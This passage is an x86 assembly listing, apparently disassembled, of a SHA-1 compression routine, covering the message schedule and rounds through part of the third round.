push ebp
mov ebp esp
sub esp 0x4c
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
push ebx
mov ebx [ eax ]
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ecx [ eax + 0x8 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0xc ]
mov esi [ eax ]
mov edi esi
ror edi 0x8
mov edx 0xff00ff00
and edi edx
rol esi 0x8
mov [ ebp - 0x8 ] ecx
mov ecx 0xff00ff
and esi ecx
or edi esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x48 ] edi
mov edi [ ebp - 0xc ]
xor edi [ ebp - 0x8 ]
mov [ ebp - 0x10 ] ebx
and edi [ ebp - 0x4 ]
rol ebx 0x5
xor edi [ esi + 0xc ]
add ebx [ ebp - 0x48 ]
add edi ebx
ror [ ebp - 0x4 ] 0x2
mov ebx esi
mov esi [ ebx + 0x10 ]
lea esi [ esi + edi + 0x5a827999 ]
mov [ ebp + 0xc ] esi
mov esi [ eax + 0x4 ]
mov edi esi
ror edi 0x8
and edi edx
rol esi 0x8
and esi ecx
or edi esi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x4c ] edi
mov edi [ ebx + 0x8 ]
xor edi [ ebp - 0x4 ]
rol esi 0x5
and edi [ ebp - 0x10 ]
add esi [ ebp - 0x4c ]
xor edi [ ebx + 0x8 ]
add edi esi
ror [ ebp - 0x10 ] 0x2
mov esi ebx
mov esi [ esi + 0xc ]
lea ebx [ esi + edi + 0x5a827999 ]
mov esi [ eax + 0x8 ]
mov edi esi
ror edi 0x8
and edi edx
rol esi 0x8
and esi ecx
or edi esi
mov esi [ ebp + 0x8 ]
mov esi [ esi + 0x8 ]
mov [ ebp - 0x2c ] edi
mov edi [ ebp - 0x4 ]
xor edi [ ebp - 0x10 ]
mov [ ebp - 0xc ] ebx
and edi [ ebp + 0xc ]
rol ebx 0x5
xor edi [ ebp - 0x4 ]
add ebx [ ebp - 0x2c ]
add edi ebx
ror [ ebp + 0xc ] 0x2
lea ebx [ esi + edi + 0x5a827999 ]
mov esi [ eax + 0xc ]
mov edi esi
ror edi 0x8
mov [ ebp - 0x8 ] ebx
and edi edx
rol esi 0x8
and esi ecx
or edi esi
mov esi [ ebp + 0xc ]
xor esi [ ebp - 0x10 ]
rol ebx 0x5
and esi [ ebp - 0xc ]
add ebx edi
xor esi [ ebp - 0x10 ]
mov [ ebp - 0x30 ] edi
add esi ebx
ror [ ebp - 0xc ] 0x2
mov edi [ ebp - 0x4 ]
lea ebx [ edi + esi + 0x5a827999 ]
mov esi [ eax + 0x10 ]
mov edi esi
ror edi 0x8
and edi edx
rol esi 0x8
and esi ecx
or edi esi
mov esi [ ebp + 0xc ]
xor esi [ ebp - 0xc ]
mov [ ebp - 0x4 ] ebx
and esi [ ebp - 0x8 ]
rol ebx 0x5
xor esi [ ebp + 0xc ]
add ebx edi
add esi ebx
ror [ ebp - 0x8 ] 0x2
mov [ ebp - 0x34 ] edi
mov edi [ ebp - 0x10 ]
lea ebx [ edi + esi + 0x5a827999 ]
mov esi [ eax + 0x14 ]
mov edi esi
ror edi 0x8
and edi edx
rol esi 0x8
and esi ecx
or edi esi
mov esi [ ebp - 0xc ]
xor esi [ ebp - 0x8 ]
mov [ ebp - 0x10 ] ebx
and esi [ ebp - 0x4 ]
rol ebx 0x5
xor esi [ ebp - 0xc ]
add ebx edi
add esi ebx
ror [ ebp - 0x4 ] 0x2
mov [ ebp - 0x38 ] edi
mov edi [ ebp + 0xc ]
lea ebx [ edi + esi + 0x5a827999 ]
mov esi [ eax + 0x18 ]
mov edi esi
ror edi 0x8
and edi edx
rol esi 0x8
and esi ecx
or edi esi
mov esi [ ebp - 0x8 ]
xor esi [ ebp - 0x4 ]
mov [ ebp + 0xc ] ebx
and esi [ ebp - 0x10 ]
rol ebx 0x5
xor esi [ ebp - 0x8 ]
add ebx edi
add esi ebx
ror [ ebp - 0x10 ] 0x2
mov [ ebp - 0x3c ] edi
mov edi [ ebp - 0xc ]
lea ebx [ edi + esi + 0x5a827999 ]
mov esi [ eax + 0x1c ]
mov edi esi
ror edi 0x8
and edi edx
rol esi 0x8
and esi ecx
or edi esi
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x40 ] edi
rol ebx 0x5
mov esi [ ebp - 0x4 ]
xor esi [ ebp - 0x10 ]
add ebx edi
and esi [ ebp + 0xc ]
mov edi [ ebp - 0x8 ]
xor esi [ ebp - 0x4 ]
add esi ebx
lea ebx [ edi + esi + 0x5a827999 ]
ror [ ebp + 0xc ] 0x2
mov esi [ eax + 0x20 ]
mov edi esi
ror edi 0x8
and edi edx
rol esi 0x8
and esi ecx
or edi esi
mov esi [ ebp + 0xc ]
xor esi [ ebp - 0x10 ]
mov [ ebp - 0x8 ] ebx
and esi [ ebp - 0xc ]
rol ebx 0x5
xor esi [ ebp - 0x10 ]
add ebx edi
add esi ebx
ror [ ebp - 0xc ] 0x2
mov [ ebp - 0x18 ] edi
mov edi [ ebp - 0x4 ]
lea ebx [ edi + esi + 0x5a827999 ]
mov esi [ eax + 0x24 ]
mov edi esi
ror edi 0x8
and edi edx
rol esi 0x8
and esi ecx
or edi esi
mov esi [ ebp + 0xc ]
xor esi [ ebp - 0xc ]
mov [ ebp - 0x4 ] ebx
and esi [ ebp - 0x8 ]
rol ebx 0x5
xor esi [ ebp + 0xc ]
add ebx edi
add esi ebx
ror [ ebp - 0x8 ] 0x2
mov [ ebp - 0x1c ] edi
mov edi [ ebp - 0x10 ]
lea ebx [ edi + esi + 0x5a827999 ]
mov esi [ eax + 0x28 ]
mov edi esi
ror edi 0x8
and edi edx
rol esi 0x8
and esi ecx
or edi esi
mov esi [ ebp - 0xc ]
xor esi [ ebp - 0x8 ]
mov [ ebp - 0x10 ] ebx
and esi [ ebp - 0x4 ]
rol ebx 0x5
xor esi [ ebp - 0xc ]
add ebx edi
add esi ebx
ror [ ebp - 0x4 ] 0x2
mov [ ebp - 0x20 ] edi
mov edi [ ebp + 0xc ]
lea ebx [ edi + esi + 0x5a827999 ]
mov esi [ eax + 0x2c ]
mov edi esi
ror edi 0x8
and edi edx
rol esi 0x8
and esi ecx
or edi esi
mov esi [ ebp - 0x8 ]
xor esi [ ebp - 0x4 ]
mov [ ebp + 0xc ] ebx
and esi [ ebp - 0x10 ]
rol ebx 0x5
xor esi [ ebp - 0x8 ]
mov [ ebp - 0x24 ] edi
add ebx edi
add esi ebx
ror [ ebp - 0x10 ] 0x2
mov edi [ ebp - 0xc ]
lea ebx [ edi + esi + 0x5a827999 ]
mov esi [ eax + 0x30 ]
mov edi esi
ror edi 0x8
and edi edx
rol esi 0x8
and esi ecx
or edi esi
mov esi [ ebp - 0x4 ]
xor esi [ ebp - 0x10 ]
mov [ ebp - 0x28 ] edi
and esi [ ebp + 0xc ]
mov [ ebp - 0xc ] ebx
xor esi [ ebp - 0x4 ]
rol ebx 0x5
add ebx edi
mov edi [ ebp - 0x8 ]
add esi ebx
ror [ ebp + 0xc ] 0x2
lea ebx [ edi + esi + 0x5a827999 ]
mov esi [ eax + 0x34 ]
mov edi esi
ror edi 0x8
and edi edx
rol esi 0x8
and esi ecx
or edi esi
mov esi [ ebp + 0xc ]
xor esi [ ebp - 0x10 ]
mov [ ebp - 0x8 ] ebx
and esi [ ebp - 0xc ]
rol ebx 0x5
xor esi [ ebp - 0x10 ]
add ebx edi
add esi ebx
ror [ ebp - 0xc ] 0x2
mov [ ebp - 0x14 ] edi
mov edi [ ebp - 0x4 ]
lea ebx [ edi + esi + 0x5a827999 ]
mov esi [ eax + 0x38 ]
mov edi esi
ror edi 0x8
and edi edx
rol esi 0x8
and esi ecx
or edi esi
mov [ ebp - 0x44 ] edi
mov edi [ ebp + 0xc ]
xor edi [ ebp - 0xc ]
mov esi [ ebp - 0x44 ]
and edi [ ebp - 0x8 ]
mov [ ebp - 0x4 ] ebx
xor edi [ ebp + 0xc ]
rol ebx 0x5
add ebx esi
add edi ebx
mov ebx [ ebp - 0x10 ]
ror [ ebp - 0x8 ] 0x2
lea edi [ ebx + edi + 0x5a827999 ]
mov ebx [ eax + 0x3c ]
mov [ ebp - 0x10 ] edi
mov edi ebx
ror edi 0x8
and edi edx
mov edx [ ebp - 0xc ]
xor edx [ ebp - 0x8 ]
rol ebx 0x8
and edx [ ebp - 0x4 ]
and ebx ecx
mov ecx [ ebp - 0x10 ]
xor edx [ ebp - 0xc ]
or edi ebx
rol ecx 0x5
add ecx edi
add edx ecx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x44 ] edi
lea edx [ ecx + edx + 0x5a827999 ]
ror [ ebp - 0x4 ] 0x2
mov ecx [ ebp - 0x14 ]
xor ecx [ ebp - 0x18 ]
xor edi [ ebp - 0x20 ]
xor ecx [ ebp - 0x2c ]
mov [ ebp + 0xc ] edx
xor ecx [ ebp - 0x48 ]
xor edi [ ebp - 0x34 ]
rol ecx 0x1
mov [ ebp - 0x48 ] ecx
mov [ eax ] ecx
mov ecx [ ebp - 0x8 ]
xor ecx [ ebp - 0x4 ]
rol edx 0x5
and ecx [ ebp - 0x10 ]
add edx [ ebp - 0x48 ]
xor ecx [ ebp - 0x8 ]
xor edi [ ebp - 0x2c ]
add ecx edx
mov edx [ ebp - 0xc ]
ror [ ebp - 0x10 ] 0x2
lea edx [ edx + ecx + 0x5a827999 ]
mov ecx esi
xor ecx [ ebp - 0x1c ]
mov [ ebp - 0xc ] edx
xor ecx [ ebp - 0x30 ]
xor ecx [ ebp - 0x4c ]
rol ecx 0x1
mov [ ebp - 0x4c ] ecx
mov [ eax + 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
xor ecx [ ebp - 0x10 ]
rol edx 0x5
and ecx [ ebp + 0xc ]
add edx [ ebp - 0x4c ]
xor ecx [ ebp - 0x4 ]
add ecx edx
ror [ ebp + 0xc ] 0x2
mov edx [ ebp - 0x8 ]
mov ebx [ ebp + 0xc ]
lea ecx [ edx + ecx + 0x5a827999 ]
mov edx [ ebp - 0x10 ]
rol edi 0x1
mov [ ebp - 0x8 ] ecx
rol ecx 0x5
add ecx edi
xor ebx edx
and ebx [ ebp - 0xc ]
mov [ eax + 0x8 ] edi
mov edi [ eax ]
xor ebx edx
add ebx ecx
mov ecx [ ebp - 0x4 ]
ror [ ebp - 0xc ] 0x2
lea ebx [ ecx + ebx + 0x5a827999 ]
mov ecx [ ebp - 0x24 ]
xor ecx [ ebp - 0x38 ]
mov [ ebp - 0x4 ] ebx
xor ecx edi
xor ecx [ ebp - 0x30 ]
mov edi [ ebp + 0xc ]
xor edi [ ebp - 0xc ]
rol ecx 0x1
and edi [ ebp - 0x8 ]
rol ebx 0x5
xor edi [ ebp + 0xc ]
add ebx ecx
mov [ eax + 0xc ] ecx
mov ecx [ eax + 0x4 ]
xor ecx [ ebp - 0x28 ]
add edi ebx
xor ecx [ ebp - 0x3c ]
ror [ ebp - 0x8 ] 0x2
xor ecx [ ebp - 0x34 ]
lea edx [ edx + edi + 0x5a827999 ]
mov edi [ ebp - 0xc ]
rol ecx 0x1
mov [ ebp - 0x10 ] edx
rol edx 0x5
xor edi [ ebp - 0x8 ]
mov [ eax + 0x10 ] ecx
xor edi [ ebp - 0x4 ]
add edx ecx
mov ecx [ ebp + 0xc ]
add edi edx
lea edx [ ecx + edi + 0x6ed9eba1 ]
ror [ ebp - 0x4 ] 0x2
mov ecx [ ebp - 0x14 ]
xor ecx [ ebp - 0x40 ]
mov edi [ ebp - 0x8 ]
xor ecx [ ebp - 0x38 ]
xor edi [ ebp - 0x4 ]
xor ecx [ eax + 0x8 ]
xor edi [ ebp - 0x10 ]
rol ecx 0x1
mov [ eax + 0x14 ] ecx
mov [ ebp + 0xc ] edx
mov ebx [ ebp + 0xc ]
xor ebx [ ebp - 0x4 ]
rol edx 0x5
add edx ecx
mov ecx [ ebp - 0xc ]
add edi edx
lea edx [ ecx + edi + 0x6ed9eba1 ]
ror [ ebp - 0x10 ] 0x2
mov ecx esi
xor ecx [ ebp - 0x18 ]
mov [ ebp - 0xc ] edx
xor ecx [ ebp - 0x3c ]
mov edi edx
xor ecx [ eax + 0xc ]
mov edx [ ebp - 0x10 ]
rol ecx 0x1
xor ebx edx
rol edi 0x5
add edi ecx
add ebx edi
ror [ ebp + 0xc ] 0x2
mov [ eax + 0x18 ] ecx
mov ecx [ ebp - 0x8 ]
lea edi [ ecx + ebx + 0x6ed9eba1 ]
mov ecx [ eax + 0x10 ]
xor ecx [ ebp - 0x44 ]
mov ebx [ ebp + 0xc ]
xor ecx [ ebp - 0x1c ]
xor ebx [ ebp - 0xc ]
xor ecx [ ebp - 0x40 ]
xor ebx edx
rol ecx 0x1
mov [ ebp - 0x8 ] edi
rol edi 0x5
add edi ecx
add ebx edi
ror [ ebp - 0xc ] 0x2
mov [ eax + 0x1c ] ecx
mov ecx [ ebp - 0x4 ]
lea edi [ ecx + ebx + 0x6ed9eba1 ]
mov ecx [ eax + 0x14 ]
xor ecx [ ebp - 0x20 ]
mov ebx [ ebp + 0xc ]
xor ecx [ ebp - 0x18 ]
xor ebx [ ebp - 0xc ]
xor ecx [ eax ]
xor ebx [ ebp - 0x8 ]
rol ecx 0x1
mov [ ebp - 0x4 ] edi
rol edi 0x5
add edi ecx
mov [ eax + 0x20 ] ecx
mov ecx [ eax + 0x4 ]
xor ecx [ ebp - 0x24 ]
add ebx edi
xor ecx [ ebp - 0x1c ]
ror [ ebp - 0x8 ] 0x2
xor ecx [ eax + 0x18 ]
mov edi [ ebp - 0xc ]
lea edx [ edx + ebx + 0x6ed9eba1 ]
rol ecx 0x1
mov [ ebp - 0x10 ] edx
rol edx 0x5
xor edi [ ebp - 0x8 ]
mov [ eax + 0x24 ] ecx
xor edi [ ebp - 0x4 ]
add edx ecx
add edi edx
ror [ ebp - 0x4 ] 0x2
mov ecx [ ebp + 0xc ]
lea edx [ ecx + edi + 0x6ed9eba1 ]
mov ecx [ ebp - 0x28 ]
xor ecx [ ebp - 0x20 ]
mov edi [ ebp - 0x8 ]
xor ecx [ eax + 0x8 ]
xor edi [ ebp - 0x4 ]
xor ecx [ eax + 0x1c ]
xor edi [ ebp - 0x10 ]
rol ecx 0x1
mov [ eax + 0x28 ] ecx
mov [ ebp + 0xc ] edx
rol edx 0x5
add edx ecx
mov ecx [ ebp - 0xc ]
add edi edx
lea edx [ ecx + edi + 0x6ed9eba1 ]
ror [ ebp - 0x10 ] 0x2
mov ecx [ eax + 0x20 ]
xor ecx [ ebp - 0x14 ]
mov edi [ ebp + 0xc ]
xor ecx [ ebp - 0x24 ]
xor edi [ ebp - 0x4 ]
xor ecx [ eax + 0xc ]
xor edi [ ebp - 0x10 ]
rol ecx 0x1
mov [ eax + 0x2c ] ecx
mov [ ebp - 0xc ] edx
rol edx 0x5
add edx ecx
mov ecx [ ebp - 0x8 ]
add edi edx
ror [ ebp + 0xc ] 0x2
lea edx [ ecx + edi + 0x6ed9eba1 ]
mov ecx [ eax + 0x10 ]
xor ecx [ eax + 0x24 ]
mov edi [ ebp + 0xc ]
xor edi [ ebp - 0xc ]
xor ecx esi
xor ecx [ ebp - 0x28 ]
xor edi [ ebp - 0x10 ]
rol ecx 0x1
xor esi [ eax ]
mov [ ebp - 0x8 ] edx
xor esi [ eax + 0x18 ]
rol edx 0x5
add edx ecx
add edi edx
ror [ ebp - 0xc ] 0x2
xor esi [ eax + 0x2c ]
mov [ eax + 0x30 ] ecx
mov ecx [ ebp - 0x4 ]
lea edx [ ecx + edi + 0x6ed9eba1 ]
mov ecx [ eax + 0x14 ]
xor ecx [ ebp - 0x44 ]
mov edi [ ebp + 0xc ]
xor ecx [ ebp - 0x14 ]
xor edi [ ebp - 0xc ]
xor ecx [ eax + 0x28 ]
xor edi [ ebp - 0x8 ]
rol ecx 0x1
mov [ ebp - 0x4 ] edx
rol edx 0x5
add edx ecx
add edi edx
ror [ ebp - 0x8 ] 0x2
mov [ eax + 0x34 ] ecx
mov ecx [ ebp - 0x10 ]
lea edx [ ecx + edi + 0x6ed9eba1 ]
mov edi [ ebp - 0xc ]
xor edi [ ebp - 0x8 ]
rol esi 0x1
xor edi [ ebp - 0x4 ]
mov ecx edx
rol ecx 0x5
mov [ eax + 0x38 ] esi
add ecx esi
add edi ecx
ror [ ebp - 0x4 ] 0x2
mov ecx [ ebp + 0xc ]
lea esi [ ecx + edi + 0x6ed9eba1 ]
mov ecx [ eax + 0x30 ]
xor ecx [ eax + 0x4 ]
mov edi [ ebp - 0x8 ]
xor ecx [ ebp - 0x44 ]
xor edi [ ebp - 0x4 ]
xor ecx [ eax + 0x1c ]
xor edi edx
rol ecx 0x1
mov [ eax + 0x3c ] ecx
mov [ ebp + 0xc ] esi
rol esi 0x5
add esi ecx
add edi esi
mov ecx [ ebp - 0xc ]
lea esi [ ecx + edi + 0x6ed9eba1 ]
mov ecx [ eax + 0x20 ]
xor ecx [ eax + 0x34 ]
mov edi [ ebp + 0xc ]
xor ecx [ eax ]
xor edi [ ebp - 0x4 ]
xor ecx [ eax + 0x8 ]
ror edx 0x2
rol ecx 0x1
xor edi edx
mov [ ebp - 0xc ] esi
rol esi 0x5
add esi ecx
add edi esi
ror [ ebp + 0xc ] 0x2
mov [ eax ] ecx
mov ecx [ ebp - 0x8 ]
lea esi [ ecx + edi + 0x6ed9eba1 ]
mov ecx [ eax + 0x24 ]
xor ecx [ eax + 0x4 ]
mov edi [ ebp + 0xc ]
xor ecx [ eax + 0x38 ]
xor edi [ ebp - 0xc ]
xor ecx [ eax + 0xc ]
xor edi edx
rol ecx 0x1
mov [ ebp - 0x8 ] esi
rol esi 0x5
add esi ecx
add edi esi
ror [ ebp - 0xc ] 0x2
mov [ eax + 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
lea esi [ ecx + edi + 0x6ed9eba1 ]
mov ecx [ eax + 0x10 ]
xor ecx [ eax + 0x28 ]
mov edi [ ebp + 0xc ]
xor ecx [ eax + 0x8 ]
xor edi [ ebp - 0xc ]
xor ecx [ eax + 0x3c ]
xor edi [ ebp - 0x8 ]
rol ecx 0x1
mov [ ebp - 0x4 ] esi
rol esi 0x5
add esi ecx
add edi esi
mov esi [ eax ]
ror [ ebp - 0x8 ] 0x2
mov [ eax + 0x8 ] ecx
mov ecx [ eax + 0x14 ]
xor ecx esi
xor ecx [ eax + 0x2c ]
lea edx [ edx + edi + 0x6ed9eba1 ]
xor ecx [ eax + 0xc ]
mov edi [ ebp - 0xc ]
xor edi [ ebp - 0x8 ]
rol ecx 0x1
xor edi [ ebp - 0x4 ]
mov esi edx
rol esi 0x5
add esi ecx
mov [ eax + 0xc ] ecx
add edi esi
ror [ ebp - 0x4 ] 0x2
mov ecx [ ebp + 0xc ]
lea esi [ ecx + edi + 0x6ed9eba1 ]
mov ecx [ eax + 0x30 ]
xor ecx [ eax + 0x10 ]
mov edi [ ebp - 0x8 ]
xor ecx [ eax + 0x4 ]
xor edi [ ebp - 0x4 ]
xor ecx [ eax + 0x18 ]
xor edi edx
rol ecx 0x1
mov [ eax + 0x10 ] ecx
mov [ ebp + 0xc ] esi
rol esi 0x5
add esi ecx
mov ecx [ ebp - 0xc ]
add edi esi
lea esi [ ecx + edi + 0x6ed9eba1 ]
mov ecx [ eax + 0x34 ]
xor ecx [ eax + 0x14 ]
mov edi [ ebp + 0xc ]
xor ecx [ eax + 0x8 ]
xor edi [ ebp - 0x4 ]
xor ecx [ eax + 0x1c ]
ror edx 0x2
rol ecx 0x1
xor edi edx
mov [ eax + 0x14 ] ecx
mov [ ebp - 0xc ] esi
rol esi 0x5
add esi ecx
mov ecx [ ebp - 0x8 ]
add edi esi
ror [ ebp + 0xc ] 0x2
lea esi [ ecx + edi + 0x6ed9eba1 ]
mov ecx [ eax + 0x20 ]
xor ecx [ eax + 0x38 ]
mov edi [ ebp + 0xc ]
xor ecx [ eax + 0x18 ]
xor edi [ ebp - 0xc ]
xor ecx [ eax + 0xc ]
xor edi edx
rol ecx 0x1
mov [ ebp - 0x8 ] esi
rol esi 0x5
add esi ecx
add edi esi
ror [ ebp - 0xc ] 0x2
mov [ eax + 0x18 ] ecx
mov ecx [ ebp - 0x4 ]
lea esi [ ecx + edi + 0x6ed9eba1 ]
mov ecx [ eax + 0x10 ]
xor ecx [ eax + 0x24 ]
mov edi [ ebp + 0xc ]
xor ecx [ eax + 0x3c ]
xor edi [ ebp - 0xc ]
xor ecx [ eax + 0x1c ]
xor edi [ ebp - 0x8 ]
rol ecx 0x1
mov [ ebp - 0x4 ] esi
rol esi 0x5
add esi ecx
add edi esi
ror [ ebp - 0x8 ] 0x2
mov ebx [ ebp - 0x8 ]
and ebx [ ebp - 0x4 ]
mov [ eax + 0x1c ] ecx
mov ecx [ eax + 0x20 ]
xor ecx [ eax + 0x14 ]
lea edx [ edx + edi + 0x6ed9eba1 ]
xor ecx [ eax ]
mov edi [ ebp - 0x8 ]
xor ecx [ eax + 0x28 ]
or edi [ ebp - 0x4 ]
rol ecx 0x1
and edi [ ebp - 0xc ]
mov esi edx
rol esi 0x5
mov [ ebp - 0x10 ] edx
mov [ eax + 0x20 ] ecx
or edi ebx
add edi ecx
add edi [ ebp + 0xc ]
ror [ ebp - 0x4 ] 0x2
mov ecx [ eax + 0x24 ]
xor ecx [ eax + 0x4 ]
mov ebx [ ebp - 0x4 ]
xor ecx [ eax + 0x18 ]
or ebx edx
xor ecx [ eax + 0x2c ]
and ebx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
and edx [ ebp - 0x10 ]
rol ecx 0x1
or ebx edx
add ebx ecx
add ebx [ ebp - 0xc ]
lea esi [ edi + esi - 0x70e44324 ]
mov [ eax + 0x24 ] ecx
mov ecx [ eax + 0x30 ]
xor ecx [ eax + 0x28 ]
mov edi esi
xor ecx [ eax + 0x8 ]
rol edi 0x5
xor ecx [ eax + 0x1c ]
ror [ ebp - 0x10 ] 0x2
lea edx [ ebx + edi - 0x70e44324 ]
rol ecx 0x1
mov [ eax + 0x28 ] ecx
mov edi esi
or edi [ ebp - 0x10 ]
mov ebx esi
and edi [ ebp - 0x4 ]
and ebx [ ebp - 0x10 ]
mov [ ebp - 0xc ] edx
or edi ebx
add edi ecx
add edi [ ebp - 0x8 ]
mov ecx [ eax + 0x20 ]
xor ecx [ eax + 0x34 ]
rol edx 0x5
xor ecx [ eax + 0x2c ]
lea edx [ edi + edx - 0x70e44324 ]
xor ecx [ eax + 0xc ]
ror esi 0x2
rol ecx 0x1
mov edi esi
or edi [ ebp - 0xc ]
mov [ eax + 0x2c ] ecx
and edi [ ebp - 0x10 ]
mov ebx esi
and ebx [ ebp - 0xc ]
mov [ ebp - 0x8 ] edx
or edi ebx
add edi ecx
add edi [ ebp - 0x4 ]
mov ecx [ eax + 0x30 ]
xor ecx [ eax + 0x10 ]
rol edx 0x5
ror [ ebp - 0xc ] 0x2
xor ecx [ eax + 0x24 ]
mov ebx [ ebp - 0xc ]
xor ecx [ eax + 0x38 ]
and ebx [ ebp - 0x8 ]
lea edx [ edi + edx - 0x70e44324 ]
mov edi [ ebp - 0xc ]
or edi [ ebp - 0x8 ]
rol ecx 0x1
and edi esi
or edi ebx
add edi ecx
add edi [ ebp - 0x10 ]
mov [ eax + 0x30 ] ecx
mov ecx [ eax + 0x34 ]
xor ecx [ eax + 0x14 ]
mov [ ebp - 0x4 ] edx
xor ecx [ eax + 0x28 ]
rol edx 0x5
ror [ ebp - 0x8 ] 0x2
xor ecx [ eax + 0x3c ]
lea edx [ edi + edx - 0x70e44324 ]
mov [ ebp - 0x10 ] edx
mov edi [ ebp - 0x8 ]
or edi [ ebp - 0x4 ]
mov ebx [ ebp - 0x8 ]
and edi [ ebp - 0xc ]
and ebx [ ebp - 0x4 ]
rol ecx 0x1
or edi ebx
add edi ecx
add edi esi
mov [ eax + 0x34 ] ecx
mov ecx [ eax + 0x38 ]
xor ecx [ eax ]
rol edx 0x5
xor ecx [ eax + 0x18 ]
ror [ ebp - 0x4 ] 0x2
xor ecx [ eax + 0x2c ]
mov ebx [ ebp - 0x4 ]
and ebx [ ebp - 0x10 ]
lea edx [ edi + edx - 0x70e44324 ]
mov edi [ ebp - 0x4 ]
or edi [ ebp - 0x10 ]
rol ecx 0x1
and edi [ ebp - 0x8 ]
mov [ eax + 0x38 ] ecx
or edi ebx
add edi ecx
add edi [ ebp - 0xc ]
mov ecx [ eax + 0x30 ]
xor ecx [ eax + 0x4 ]
mov esi edx
xor ecx [ eax + 0x3c ]
rol esi 0x5
ror [ ebp - 0x10 ] 0x2
xor ecx [ eax + 0x1c ]
lea esi [ edi + esi - 0x70e44324 ]
rol ecx 0x1
mov edi edx
or edi [ ebp - 0x10 ]
mov ebx edx
and edi [ ebp - 0x4 ]
and ebx [ ebp - 0x10 ]
mov [ eax + 0x3c ] ecx
or edi ebx
add edi ecx
add edi [ ebp - 0x8 ]
mov ecx [ eax + 0x20 ]
xor ecx [ eax + 0x34 ]
mov [ ebp - 0xc ] esi
xor ecx [ eax ]
rol esi 0x5
xor ecx [ eax + 0x8 ]
lea esi [ edi + esi - 0x70e44324 ]
ror edx 0x2
rol ecx 0x1
mov edi edx
or edi [ ebp - 0xc ]
mov ebx edx
and edi [ ebp - 0x10 ]
and ebx [ ebp - 0xc ]
mov [ eax ] ecx
or edi ebx
add edi ecx
add edi [ ebp - 0x4 ]
mov ecx [ eax + 0x24 ]
xor ecx [ eax + 0x4 ]
mov [ ebp - 0x8 ] esi
xor ecx [ eax + 0x38 ]
rol esi 0x5
ror [ ebp - 0xc ] 0x2
xor ecx [ eax + 0xc ]
mov ebx [ ebp - 0xc ]
and ebx [ ebp - 0x8 ]
lea esi [ edi + esi - 0x70e44324 ]
mov edi [ ebp - 0xc ]
or edi [ ebp - 0x8 ]
rol ecx 0x1
mov [ ebp - 0x4 ] esi
and edi edx
rol esi 0x5
mov [ eax + 0x4 ] ecx
or edi ebx
add edi ecx
add edi [ ebp - 0x10 ]
ror [ ebp - 0x8 ] 0x2
mov ecx [ eax + 0x10 ]
xor ecx [ eax + 0x28 ]
lea esi [ edi + esi - 0x70e44324 ]
xor ecx [ eax + 0x8 ]
mov edi [ ebp - 0x8 ]
or edi [ ebp - 0x4 ]
xor ecx [ eax + 0x3c ]
and edi [ ebp - 0xc ]
mov ebx [ ebp - 0x8 ]
and ebx [ ebp - 0x4 ]
rol ecx 0x1
or edi ebx
add edi ecx
add edi edx
mov [ eax + 0x8 ] ecx
mov ecx [ eax + 0x14 ]
mov [ ebp - 0x10 ] esi
rol esi 0x5
ror [ ebp - 0x4 ] 0x2
lea edx [ edi + esi - 0x70e44324 ]
mov esi [ eax ]
mov edi [ ebp - 0x4 ]
or edi [ ebp - 0x10 ]
mov ebx [ ebp - 0x4 ]
and edi [ ebp - 0x8 ]
and ebx [ ebp - 0x10 ]
xor ecx esi
xor ecx [ eax + 0x2c ]
or edi ebx
xor ecx [ eax + 0xc ]
mov esi edx
rol ecx 0x1
add edi ecx
add edi [ ebp - 0xc ]
mov [ eax + 0xc ] ecx
mov ecx [ eax + 0x30 ]
xor ecx [ eax + 0x10 ]
rol esi 0x5
xor ecx [ eax + 0x4 ]
ror [ ebp - 0x10 ] 0x2
xor ecx [ eax + 0x18 ]
lea esi [ edi + esi - 0x70e44324 ]
rol ecx 0x1
mov edi edx
or edi [ ebp - 0x10 ]
mov ebx edx
and edi [ ebp - 0x4 ]
and ebx [ ebp - 0x10 ]
mov [ eax + 0x10 ] ecx
or edi ebx
add edi ecx
add edi [ ebp - 0x8 ]
mov ecx [ eax + 0x34 ]
xor ecx [ eax + 0x14 ]
mov [ ebp - 0xc ] esi
xor ecx [ eax + 0x8 ]
rol esi 0x5
xor ecx [ eax + 0x1c ]
lea esi [ edi + esi - 0x70e44324 ]
ror edx 0x2
mov edi edx
or edi [ ebp - 0xc ]
rol ecx 0x1
and edi [ ebp - 0x10 ]
mov ebx edx
and ebx [ ebp - 0xc ]
mov [ eax + 0x14 ] ecx
or edi ebx
add edi ecx
add edi [ ebp - 0x4 ]
mov ecx [ eax + 0x20 ]
xor ecx [ eax + 0x38 ]
mov [ ebp - 0x8 ] esi
rol esi 0x5
ror [ ebp - 0xc ] 0x2
xor ecx [ eax + 0x18 ]
lea esi [ edi + esi - 0x70e44324 ]
mov [ ebp - 0x4 ] esi
xor ecx [ eax + 0xc ]
mov edi [ ebp - 0xc ]
or edi [ ebp - 0x8 ]
mov ebx [ ebp - 0xc ]
and ebx [ ebp - 0x8 ]
and edi edx
or edi ebx
rol ecx 0x1
add edi ecx
add edi [ ebp - 0x10 ]
mov [ eax + 0x18 ] ecx
mov ecx [ eax + 0x10 ]
xor ecx [ eax + 0x24 ]
rol esi 0x5
xor ecx [ eax + 0x3c ]
ror [ ebp - 0x8 ] 0x2
xor ecx [ eax + 0x1c ]
mov ebx [ ebp - 0x8 ]
and ebx [ ebp - 0x4 ]
lea esi [ edi + esi - 0x70e44324 ]
mov edi [ ebp - 0x8 ]
or edi [ ebp - 0x4 ]
rol ecx 0x1
and edi [ ebp - 0xc ]
mov [ eax + 0x1c ] ecx
or edi ebx
add edi ecx
mov ecx [ eax + 0x20 ]
xor ecx [ eax + 0x14 ]
add edi edx
xor ecx [ eax ]
mov [ ebp - 0x10 ] esi
xor ecx [ eax + 0x28 ]
rol esi 0x5
ror [ ebp - 0x4 ] 0x2
mov ebx [ ebp - 0x4 ]
and ebx [ ebp - 0x10 ]
lea edx [ edi + esi - 0x70e44324 ]
mov edi [ ebp - 0x4 ]
or edi [ ebp - 0x10 ]
rol ecx 0x1
and edi [ ebp - 0x8 ]
mov [ eax + 0x20 ] ecx
or edi ebx
add edi ecx
add edi [ ebp - 0xc ]
